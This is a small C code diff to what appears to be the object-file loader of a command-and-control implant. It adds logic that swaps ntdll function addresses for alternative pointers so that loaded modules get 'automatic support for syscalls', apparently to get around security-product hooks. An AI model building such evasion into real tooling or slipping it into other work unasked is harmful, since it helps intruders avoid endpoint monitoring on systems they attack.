@@ -186,6 +186,25 @@ BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, P
         }
 #endif
 
+        /*
+         * we overwrite the addresses of some Nt apis to provide
+         * automatic support for syscalls to BOFs
+         */
+        if ( hLibrary == Instance.Modules.Ntdll )
+        {
+            for ( DWORD i = 0 ;; i++ )
+            {
+                if ( ! NtApi[ i ].NameHash )
+                    break;
+
+                if ( HashStringA( SymName ) == NtApi[ i ].NameHash )
+                {
+                    *pFuncAddr = NtApi[ i ].Pointer;
+                    return TRUE;
+                }
+            }
+        }
+
         AnsiString.Length        = StringLengthA( SymName );
         AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
         AnsiString.Buffer        = SymName;
